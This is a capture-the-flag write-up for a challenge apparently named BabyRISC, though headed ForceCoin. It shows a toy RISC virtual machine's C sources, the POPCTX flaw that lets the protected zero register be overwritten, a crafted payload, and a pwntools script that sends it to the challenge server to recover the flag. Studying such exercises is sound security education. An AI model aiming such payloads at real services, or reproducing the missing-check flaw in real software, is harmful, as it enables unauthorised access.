# ForceCoin
Category: PWN, 150 points


## Description

> Following ARM's success, I went ahead and designed my own RISC assembly language.
> 
> I wrote a simulator, so you'll be able to run your own programs and enjoy the (very) reduced instruction set!
> 
> Of course, with such minimal implementation, reading the flag is impossible.

An archive file was attached, containing the following files:
```console
root@kali:/media/sf_CTFs/shabak/BabyRISC# tree BabyRISC
BabyRISC
├── babyrisc
├── Dockerfile
├── inc
│   ├── asm_execution.h
│   ├── asm_file_generation.h
│   ├── asm_file_parsing.h
│   ├── asm_instructions.h
│   ├── asm_processor_state.h
│   ├── asm_types.h
│   ├── common.h
│   └── prompt.h
├── Makefile
├── payload_builder
│   ├── build_payload.c
│   └── Makefile
├── src
│   ├── asm_execution.c
│   ├── asm_file_generation.c
│   ├── asm_file_parsing.c
│   ├── asm_instructions.c
│   ├── asm_processor_state.c
│   ├── main.c
│   └── prompt.c
└── ynetd
```

We won't attach the complete sources since they are quite long. The following is a reduced version.

### main.c
```c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include "prompt.h"
#include "common.h"
#include "asm_types.h"
#include "asm_file_generation.h"
#include "asm_execution.h"

#define MAX_FLAG_SIZE (256)
#define FLAG_FILE_PATH "flag"
#define MAX_ADMIN_PAYLOAD_SIZE (1024)
#define MAX_USER_PAYLOAD_SIZE (4096)
#define TERMINATE_MARKER_UINT32 (0xfffffffful)

static void disable_io_buffering(void)
{
    // ...
}

// Reads the flag from the flag file into the buffer.
// The flag is written null-terminated (and the rest of the buffer is padded with nulls).
// Return 0 on success, otherwise - error.
static int read_flag(char * buffer, size_t buffer_len)
{
    // ...
}

// Writes the admin shellcode to the 'payload' buffer.
// Writes the actual size of the payload to 'payload_size_out'.
static int generate_admin_code(uint8_t * payload, size_t max_size, size_t * payload_size_out)
{
    int ret = E_SUCCESS;
    char flag_string[MAX_FLAG_SIZE] = { 0 };
    FILE * payload_fp = NULL;

    ret = read_flag(flag_string, sizeof(flag_string));
    if (ret != E_SUCCESS)
    {
        printf("Failed to read flag.\n");
        goto cleanup;
    }

    payload_fp = fmemopen(payload, max_size, "w");
    if (payload_fp == NULL)
    {
        ret = E_FOPEN;
        goto cleanup;
    }

    // Write admin shellcode to payload buffer
    // (Because E_SUCCESS == 0, we just OR all the return values, to check for error when we finish).
    ret = E_SUCCESS;

    // Pad out with newlines
    for (size_t i = 0; i < 8; ++i)
    {
        ret |= file_write_opcode(payload_fp, PRINTNL);
    }

    // If the user sets R0 so (R0 * 42) == 1 (impossible!), she deserves to read the flag
    ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R1, ASM_REGISTER_ZERO, 42);
    ret |= file_write_opcode3(payload_fp, MUL, ASM_REGISTER_R2, ASM_REGISTER_R0, ASM_REGISTER_R1);
    ret |= file_write_opcode_imm32(payload_fp, SUBI, ASM_REGISTER_R2, ASM_REGISTER_R2, 1);
    ret |= file_write_opcode1(payload_fp, RETNZ, ASM_REGISTER_R2);

    // Print each 4-bytes of the flag as 4-characters
    // (We might print some trailing null-characters if the flag length is not divisible by 4)
    int32_t * flag_start = (int32_t *)flag_string;
    int32_t * flag_end = (int32_t *)((char *)flag_string + strlen(flag_string));
    for (int32_t * p = flag_start; p <= flag_end; ++p)
    {
        int32_t dword = *p;

        ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R1, ASM_REGISTER_ZERO, dword);
        for (size_t j = 0; j < 4; j++)
        {
            ret |= file_write_opcode1(payload_fp, PRINTC, ASM_REGISTER_R1);
            ret |= file_write_opcode_imm32(payload_fp, ROR, ASM_REGISTER_R1, ASM_REGISTER_R1, 8);
        }
    }

    ret |= file_write_opcode(payload_fp, PRINTNL);
    ret |= file_write_opcode(payload_fp, RET);

    // Check if some error (other than E_SUCCESS) was recieved during the admin code generation
    if (ret != E_SUCCESS)
    {
        ret = E_ADMIN_CODE_ERR;
        goto cleanup;
    }

    // Success
    long offset = ftell(payload_fp);
    if (offset == -1)
    {
        ret = E_FTELL;
        goto cleanup;
    }
    *payload_size_out = (size_t)offset;

cleanup:
    if (payload_fp != NULL)
    {
        fclose(payload_fp);
    }
    return ret;
}

// Read the user code from 'stdin'. The code must be terminated with 4 0xff bytes (0xffffffff).
// The code maximum size is 'max_size'.
static int read_user_code(uint8_t * payload, size_t max_size, size_t * payload_size_out)
{
    // ...
}

int main(void)
{
    int ret = E_SUCCESS;
    disable_io_buffering();
    uint8_t admin_payload[MAX_ADMIN_PAYLOAD_SIZE] = { 0 };
    size_t admin_payload_size = 0;
    uint8_t user_payload[MAX_USER_PAYLOAD_SIZE] = { 0 };
    size_t user_payload_size = 0;
    uint8_t * combined_payload = NULL;
    size_t combined_payload_size = 0;

    ret = generate_admin_code(admin_payload, sizeof(admin_payload), &admin_payload_size);
    if (ret != E_SUCCESS)
    {
        printf("Failed to generate admin code\n");
        goto cleanup;
    }

    ret = read_user_code(user_payload, sizeof(user_payload), &user_payload_size);
    if (ret != E_SUCCESS)
    {
        printf("Failed to read code from user (stdin).\n");
        goto cleanup;
    }
    printf("User payload size: %ld\n", user_payload_size);

    // Combine the payloads
    combined_payload_size = user_payload_size + admin_payload_size;
    combined_payload = malloc(combined_payload_size);
    if (combined_payload == NULL)
    {
        ret = E_NOMEM;
        goto cleanup;
    }
    memcpy(combined_payload, user_payload, user_payload_size);
    memcpy(&combined_payload[user_payload_size], admin_payload, admin_payload_size);

    // Execute the code!
    PROMPT_PRINTF_COLOR(GRN, "Executing code!\n");
    ret = execute_asm_memory(combined_payload, combined_payload_size);

cleanup:
    return ret;
}
```

### asm_processor_state.h
```c

#pragma once
#ifndef __ASM_PROCESSOR_STATE_H
#define __ASM_PROCESSOR_STATE_H

#include "asm_types.h"
#include "common.h"

// Registers indices
typedef enum asm_register_e
{
    ASM_REGISTER_START,
    ASM_REGISTER_ZERO = ASM_REGISTER_START,
    ASM_REGISTER_R0,
    ASM_REGISTER_R1,
    ASM_REGISTER_R2,
    ASM_REGISTER_R3,
    ASM_REGISTER_R4,
    ASM_REGISTER_R5,
    ASM_REGISTER_R6,
    ASM_REGISTER_SP,
    ASM_REGISTER_END
} asm_register_t;

#define ASM_STACK_SIZE (4096)
extern uint8_t asm_stack[ASM_STACK_SIZE];
extern reg_value_t registers[ASM_REGISTER_END - ASM_REGISTER_START];

void initialize_context(void);
int read_reg(asm_register_t reg, reg_value_t * reg_out);
int write_reg(asm_register_t reg, reg_value_t value);

#endif /* __ASM_PROCESSOR_STATE_H */
```

### asm_processor_state.c
```c
#include <string.h>
#include "asm_processor_state.h"

// The actual stack & registers of the processor
uint8_t asm_stack[ASM_STACK_SIZE] = { 0 };
reg_value_t registers[ASM_REGISTER_END - ASM_REGISTER_START] = { 0 };

void initialize_context(void)
{
    memset(registers, 0, sizeof(registers));
    memset(asm_stack, 0, sizeof(asm_stack));
}

int read_reg(asm_register_t reg, reg_value_t * reg_out)
{
    if (reg < 0 || reg >= sizeof(registers) / sizeof(reg_value_t))
    {
        return E_R_INVLD_REG;
    }

    *reg_out = registers[reg];
    return E_SUCCESS;
}

int write_reg(asm_register_t reg, reg_value_t value)
{
    if (reg < 0 || reg >= sizeof(registers) / sizeof(reg_value_t))
    {
        return E_W_INVLD_REG;
    }
    else if (reg == ASM_REGISTER_ZERO)
    {
        return E_W2ZERO;
    }

    registers[reg] = value;
    return E_SUCCESS;
}
```

### asm_instructions.c
```c
#include "asm_instructions.h"
#include "asm_processor_state.h"
#include "asm_file_parsing.h"
#include "string.h"

#define _rotl(x, r) (((x) << (r)) | ((x) >> (32 - (r))))
#define _rotr(x, r) (((x) >> (r)) | ((x) << (32 - (r))))

// The INSTRUCTION_DEFINE_BINARY_* macros below allow you to quickly define binary operations without
// implementing any code yourself. Just pass the "operator" to be applied.

// Define binary operation (which is: "reg0 = reg1 (op) reg2")
// Here just pass the 'operator' as the (op) being made
#define INSTRUCTION_DEFINE_BINARY_OP(opcode, operator)                                                                 \
    INSTRUCTION_DEFINE_OP3(opcode)                                                                                     \
    {                                                                                                                  \
        //...                                                                                                          \
    }

// Define binary 32-bit immediate operation (which is: "reg0 = reg1 (op) imm32")
// Here just pass the 'operator' as the (op) being made
#define INSTRUCTION_DEFINE_BINARY_IMM32_OP(opcode, operator)                                                           \
    INSTRUCTION_DEFINE_OP_IMM32(opcode)                                                                                \
    {                                                                                                                  \
        //...                                                                                                          \
    }

// Each of the INSTRUCTION_DEFINE_OP* macros below allow you to define new instructions.
// The effect of using these macros is generating a new symbol "__INSTRUCTION_DEFINE_(opcode)", which contains
// the implementation for the opcode itself. The code you will write after the invocation will be the
// "__INSTRUCTION_IMPL_(opcode)" symbol, which gets as parameters the registers / immediate of the instruction.

// Define instruction with no operands
#define INSTRUCTION_DEFINE_OP0(opcode)                                                                                 \
        //...                                                                                                          \

// Define instruction with a single register operand
#define INSTRUCTION_DEFINE_OP1(opcode)                                                                                 \
        //...                                                                                                          \

// Define instruction with two registers operand
#define INSTRUCTION_DEFINE_OP2(opcode)                                                                                 \
        //...                                                                                                          \

// Define instruction with three registers operand
#define INSTRUCTION_DEFINE_OP3(opcode)                                                                                 \
        //...                                                                                                          \

// Define instruction with two registers operands and a single 32-bit immediate
#define INSTRUCTION_DEFINE_OP_IMM32(opcode)                                                                            \
        //...                                                                                                          \

// Actually define all the binary operations
INSTRUCTION_DEFINE_BINARY_OP(AND, &)
INSTRUCTION_DEFINE_BINARY_OP(ADD, +)
INSTRUCTION_DEFINE_BINARY_OP(XOR, ^)
INSTRUCTION_DEFINE_BINARY_OP(SUB, -)
INSTRUCTION_DEFINE_BINARY_OP(MUL, *)
INSTRUCTION_DEFINE_BINARY_OP(OR, |)
INSTRUCTION_DEFINE_BINARY_IMM32_OP(ANDI, &)
INSTRUCTION_DEFINE_BINARY_IMM32_OP(ADDI, +)
INSTRUCTION_DEFINE_BINARY_IMM32_OP(XORI, ^)
INSTRUCTION_DEFINE_BINARY_IMM32_OP(SUBI, -)
INSTRUCTION_DEFINE_BINARY_IMM32_OP(MULI, *)
INSTRUCTION_DEFINE_BINARY_IMM32_OP(ORI, |)
INSTRUCTION_DEFINE_BINARY_IMM32_OP(SHR, >>)
INSTRUCTION_DEFINE_BINARY_IMM32_OP(SHL, <<)

// Actually define all other instructions

INSTRUCTION_DEFINE_OP0(PRINTNL)
{
    printf("\n");
    return E_SUCCESS;
}

INSTRUCTION_DEFINE_OP1(PRINTDX)
{
    int ret = E_SUCCESS;
    reg_value_t value = 0;
    ret = read_reg(reg0, &value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    printf("%x", value);

cleanup:
    return ret;
}

INSTRUCTION_DEFINE_OP1(PRINTDD)
{
    int ret = E_SUCCESS;
    reg_value_t value = 0;
    ret = read_reg(reg0, &value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    printf("%d", value);

cleanup:
    return ret;
}

INSTRUCTION_DEFINE_OP1(PRINTC)
{
    int ret = E_SUCCESS;
    reg_value_t value = 0;
    ret = read_reg(reg0, &value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    printf("%c", value & 0xff);

cleanup:
    return ret;
}

INSTRUCTION_DEFINE_OP0(RET)
{
    return E_RETURN;
}

INSTRUCTION_DEFINE_OP1(RETNZ)
{
    int ret = E_SUCCESS;
    reg_value_t value = 0;
    ret = read_reg(reg0, &value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    if (value != 0)
    {
        ret = E_RETURN;
    }

cleanup:
    return ret;
}

INSTRUCTION_DEFINE_OP1(RETZ)
{
    int ret = E_SUCCESS;
    reg_value_t value = 0;
    ret = read_reg(reg0, &value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    if (value == 0)
    {
        ret = E_RETURN;
    }

cleanup:
    return ret;
}

INSTRUCTION_DEFINE_OP1(PUSH)
{
    int ret = E_SUCCESS;
    reg_value_t reg_val = 0;
    reg_value_t sp_val = 0;
    ret = read_reg(reg0, &reg_val);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    ret = read_reg(ASM_REGISTER_SP, &sp_val);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    if (sp_val < (reg_value_t)0 || sp_val > (reg_value_t)(ASM_STACK_SIZE - sizeof(reg_val)))
    {
        ret = E_STACK_VIOLATION;
        goto cleanup;
    }
    memcpy(&asm_stack[sp_val], &reg_val, sizeof(reg_val));
    ret = write_reg(ASM_REGISTER_SP, sp_val + sizeof(reg_val));

cleanup:
    return ret;
}

INSTRUCTION_DEFINE_OP1(POP)
{
    int ret = E_SUCCESS;
    reg_value_t reg_val = 0;
    reg_value_t sp_val = 0;

    ret = read_reg(ASM_REGISTER_SP, &sp_val);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    if (sp_val < (reg_value_t)sizeof(reg_val) || sp_val > (reg_value_t)ASM_STACK_SIZE)
    {
        ret = E_STACK_VIOLATION;
        goto cleanup;
    }

    sp_val -= sizeof(reg_val);
    memcpy(&reg_val, &asm_stack[sp_val], sizeof(reg_val));

    ret = write_reg(reg0, reg_val);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    ret = write_reg(ASM_REGISTER_SP, sp_val);

cleanup:
    return ret;
}

INSTRUCTION_DEFINE_OP0(PUSHCTX)
{
    int ret = E_SUCCESS;
    reg_value_t sp_val = 0;

    ret = read_reg(ASM_REGISTER_SP, &sp_val);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    if (sp_val < (reg_value_t)0 || sp_val > (reg_value_t)(ASM_STACK_SIZE - sizeof(registers)))
    {
        ret = E_STACK_VIOLATION;
        goto cleanup;
    }
    memcpy(&asm_stack[sp_val], registers, sizeof(registers));
    ret = write_reg(ASM_REGISTER_SP, sp_val + sizeof(registers));

cleanup:
    return ret;
}

INSTRUCTION_DEFINE_OP0(POPCTX)
{
    int ret = E_SUCCESS;
    reg_value_t sp_val = 0;

    ret = read_reg(ASM_REGISTER_SP, &sp_val);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    if (sp_val < (reg_value_t)sizeof(registers) || sp_val > (reg_value_t)ASM_STACK_SIZE)
    {
        ret = E_STACK_VIOLATION;
        goto cleanup;
    }

    sp_val -= sizeof(registers);
    memcpy(registers, &asm_stack[sp_val], sizeof(registers));

cleanup:
    return ret;
}

// We must implement division fully in-order to handle division-by-zero.
INSTRUCTION_DEFINE_OP3(DIV)
{
    int ret = E_SUCCESS;
    reg_value_t value1 = 0;
    reg_value_t value2 = 0;
    ret = read_reg(reg1, &value1);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    ret = read_reg(reg2, &value2);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    if (value2 == 0)
    {
        ret = E_DIV_ZERO;
        goto cleanup;
    }

    value1 = value1 / value2;

    ret = write_reg(reg0, value1);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

cleanup:
    return ret;
}

// We must implement division fully in-order to handle division-by-zero.
INSTRUCTION_DEFINE_OP_IMM32(DIVI)
{
    int ret = E_SUCCESS;
    reg_value_t value = 0;
    ret = read_reg(reg1, &value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    if (imm32 == 0)
    {
        ret = E_DIV_ZERO;
        goto cleanup;
    }

    value = value / imm32;

    ret = write_reg(reg0, value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

cleanup:
    return ret;
}

INSTRUCTION_DEFINE_OP_IMM32(ROL)
{
    int ret = E_SUCCESS;
    reg_value_t value = 0;
    ret = read_reg(reg1, &value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    value = _rotl(value, imm32);

    ret = write_reg(reg0, value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

cleanup:
    return ret;
}

INSTRUCTION_DEFINE_OP_IMM32(ROR)
{
    int ret = E_SUCCESS;
    reg_value_t value = 0;
    ret = read_reg(reg1, &value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    value = _rotr(value, imm32);

    ret = write_reg(reg0, value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

cleanup:
    return ret;
}

// This is the table containing the function pointers for the instructions implementations.
// If you add an instruction, add the INSTRUCTION_SYMBOL entry to this table with the opcode value.

#define INSTRUCTION_SYMBOL(opcode) [opcode] = __INSTRUCTION_DEFINE_##opcode
instruction_definition_t asm_instruction_definitions[MAX_ASM_OPCODE_VAL] = {
    INSTRUCTION_SYMBOL(ADD),     INSTRUCTION_SYMBOL(ADDI),    INSTRUCTION_SYMBOL(AND),    INSTRUCTION_SYMBOL(ANDI),
    INSTRUCTION_SYMBOL(DIV),     INSTRUCTION_SYMBOL(DIVI),    INSTRUCTION_SYMBOL(MUL),    INSTRUCTION_SYMBOL(MULI),
    INSTRUCTION_SYMBOL(OR),      INSTRUCTION_SYMBOL(ORI),     INSTRUCTION_SYMBOL(PRINTC), INSTRUCTION_SYMBOL(PRINTDD),
    INSTRUCTION_SYMBOL(PRINTDX), INSTRUCTION_SYMBOL(PRINTNL), INSTRUCTION_SYMBOL(RET),    INSTRUCTION_SYMBOL(RETNZ),
    INSTRUCTION_SYMBOL(RETZ),    INSTRUCTION_SYMBOL(ROL),     INSTRUCTION_SYMBOL(ROR),    INSTRUCTION_SYMBOL(SHL),
    INSTRUCTION_SYMBOL(SHR),     INSTRUCTION_SYMBOL(SUB),     INSTRUCTION_SYMBOL(SUBI),   INSTRUCTION_SYMBOL(XOR),
    INSTRUCTION_SYMBOL(XORI),    INSTRUCTION_SYMBOL(PUSH),    INSTRUCTION_SYMBOL(POP),    INSTRUCTION_SYMBOL(PUSHCTX),
    INSTRUCTION_SYMBOL(POPCTX),
};

```

## Solution:

This looks like some sort of a virtual machine implementing a RISC instruction set. The main function reads some instructions from the user, then appends some "admin" instructions which print the flag under certain conditions:
```c
    // If the user sets R0 so (R0 * 42) == 1 (impossible!), she deserves to read the flag
    ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R1, ASM_REGISTER_ZERO, 42);
    ret |= file_write_opcode3(payload_fp, MUL, ASM_REGISTER_R2, ASM_REGISTER_R0, ASM_REGISTER_R1);
    ret |= file_write_opcode_imm32(payload_fp, SUBI, ASM_REGISTER_R2, ASM_REGISTER_R2, 1);
    ret |= file_write_opcode1(payload_fp, RETNZ, ASM_REGISTER_R2);
```

Our goal is to set R0 to that `(R0 * 42) == 1`. As the comment says, that's impossible if we follow the rules, therefore we must bypass them.

Let's convert the code above to easier-to-view pseudo-code:
```
REG_R1 = REG_ZERO + 42
REG_R2 = REG_R0 * REG_R1
REG_R2 = REG_R2 - 1
IF <result> != 0 {
    RETURN
}
```

`ASM_REGISTER_ZERO` is a register that always returns the value of zero. It would be nice if we could override it with a different value, since that would let us manipulate the equation, but the virtual machine blocks this explicitly:

```c
int write_reg(asm_register_t reg, reg_value_t value)
{
    if (reg < 0 || reg >= sizeof(registers) / sizeof(reg_value_t))
    {
        return E_W_INVLD_REG;
    }
    else if (reg == ASM_REGISTER_ZERO)
    {
        return E_W2ZERO;
    }

    registers[reg] = value;
    return E_SUCCESS;
}
```

Or does it? Let's take a closer look at where the virtual machine stores its register values: The global `registers` array. Using `write_reg` is one way to modify the value of registers, but it blocks changing `ASM_REGISTER_ZERO` as we saw. Luckily, there seems to be another function modifying the array which is less restrictive:

```c
INSTRUCTION_DEFINE_OP0(POPCTX)
{
    int ret = E_SUCCESS;
    reg_value_t sp_val = 0;

    ret = read_reg(ASM_REGISTER_SP, &sp_val);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    if (sp_val < (reg_value_t)sizeof(registers) || sp_val > (reg_value_t)ASM_STACK_SIZE)
    {
        ret = E_STACK_VIOLATION;
        goto cleanup;
    }

    sp_val -= sizeof(registers);
    memcpy(registers, &asm_stack[sp_val], sizeof(registers));

cleanup:
    return ret;
}
```

This function is the counterpart of `PUSHCTX`, which pushes all registers to the stack. Using this function, the register values get popped back from the stack to the registers themselves. Yes, even `ASM_REGISTER_ZERO`.

So, if we want to modify the value of `ASM_REGISTER_ZERO`, we just need to prepare a stack where the value we want to write is located at the correct location to be popped into the register array. 

Now that we know how to write, let's find the value we want to write. Looks like we can fix the equation by setting `ASM_REGISTER_ZERO` to `-41` and setting `ASM_REGISTER_R0` to `1`:

```
REG_R1 = REG_ZERO + 42      ; REG_R1 = -41 + 42 = 1
REG_R2 = REG_R0 * REG_R1    ; REG_R2 = 1 * 1 = 1
REG_R2 = REG_R2 - 1         ; REG_R2 = 1 - 1 = 0
IF <result> != 0 {
    RETURN
}
```

In the attached files we have received a program called `payload_builder`, which allows us to build a payload using C instructions just like the main function does. We'll use the following payload:

```c
ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R0, ASM_REGISTER_ZERO, -41);

ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);

ret |= file_write_opcode(payload_fp, POPCTX);
ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R0, ASM_REGISTER_ZERO, 42); // Note that ASM_REGISTER_ZERO is -41 at this stage
```

We build the program and run it:

```console
ubuntu@cloudhost:~/BabyRISC/BabyRISC/payload_builder$ ./payload_builder
Written 37 bytes to 'payload.bin'.
ubuntu@cloudhost:~/BabyRISC/BabyRISC/payload_builder$ xxd payload.bin
00000000: 0101 00d7 ffff ff19 0119 0119 0119 0119  ................
00000010: 0119 0119 0119 0119 011c 0101 002a 0000  .............*..
00000020: 00ff ffff ff                             .....
```

Now, all that's left is to decode the flag, after it has been ROR-ed by the program via:
```c
// Print each 4-bytes of the flag as 4-characters
// (We might print some trailing null-characters if the flag length is not divisible by 4)
int32_t * flag_start = (int32_t *)flag_string;
int32_t * flag_end = (int32_t *)((char *)flag_string + strlen(flag_string));
for (int32_t * p = flag_start; p <= flag_end; ++p)
{
    int32_t dword = *p;

    ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R1, ASM_REGISTER_ZERO, dword);
    for (size_t j = 0; j < 4; j++)
    {
        ret |= file_write_opcode1(payload_fp, PRINTC, ASM_REGISTER_R1);
        ret |= file_write_opcode_imm32(payload_fp, ROR, ASM_REGISTER_R1, ASM_REGISTER_R1, 8);
    }
}
```

Notice that this code has run after `ASM_REGISTER_ZERO` has been set to `-41`, so to get the real `dword` value we will have to reverse the operation.

We'll use the following script to retrieve and decode the flag:

```python
from pwn import *
import re

r = remote("babyrisc.shieldchallenges.com", 9070)

with open("payload.bin", "rb") as payload_file:
    payload = payload_file.read()
    log.info(f"Sending payload: \n{hexdump(payload)}")
    r.send(payload)
    log.info(f"Received: '{r.recvline().decode('ascii').rstrip()}'")
    log.info(f"Received: '{r.recvline().decode('ascii').rstrip()}'")
    output = r.recvall()
    print(f"Received: \n{hexdump(output)}")
    if flag_match := re.search(b'\n\n\n\n\n\n\n\n(.*)\n\x1b', output):
        flag_encoded = flag_match.group(1)
        ASM_REGISTER_ZERO = -41
        flag = ""

        for value in unpack_many(flag_encoded, 32, endian='little', sign=False):
            real_value = value - ASM_REGISTER_ZERO
            for i in range(4):
                flag += chr(real_value & 0xFF)
                real_value = ror(real_value, 8, 32)

        log.success("Flag: {}".format(flag.rstrip('\x00')))
```

Output:
```console
root@kali:/media/sf_CTFs/shabak/BabyRISC# python3 solve.py
[+] Opening connection to babyrisc.shieldchallenges.com on port 9070: Done
[*] Sending payload:
    00000000  01 01 00 d7  ff ff ff 19  01 19 01 19  01 19 01 19  │····│····│····│····│
    00000010  01 19 01 19  01 19 01 19  01 1c 01 01  00 2a 00 00  │····│····│····│·*··│
    00000020  00 ff ff ff  ff                                     │····│·│
    00000025
[*] Received: 'User payload size: 33'
[*] Received: '>>> Executing code!'
[+] Receiving all data: Done (106B)
[*] Closed connection to babyrisc.shieldchallenges.com port 9070
Received:
00000000  1b 5b 30 6d  0a 0a 0a 0a  0a 0a 0a 0a  3d 6c 61 67  │·[0m│····│····│=lag│
00000010  52 52 49 53  1a 5f 64 6f  3c 73 6e 74  36 72 65 64  │RRIS│·_do│<snt│6red│
00000020  4c 63 65 5f  38 6d 6f 75  45 74 5f 6f  3d 5f 62 75  │Lce_│8mou│Et_o│=_bu│
00000030  3e 73 5f 61  3d 74 65 72  36 61 6c 6c  54 00 00 00  │>s_a│=ter│6all│T···│
00000040  0a 1b 5b 33  36 6d 3e 3e  3e 20 1b 5b  30 6d 65 78  │··[3│6m>>│> ·[│0mex│
00000050  65 63 75 74  65 64 20 30  78 38 46 20  69 6e 73 74  │ecut│ed 0│x8F │inst│
00000060  72 75 63 74  69 6f 6e 73  0a 0a                     │ruct│ions│··│
0000006a
[+] Flag: flag{RISC_doesnt_reduce_amount_of_bugs_after_all}
```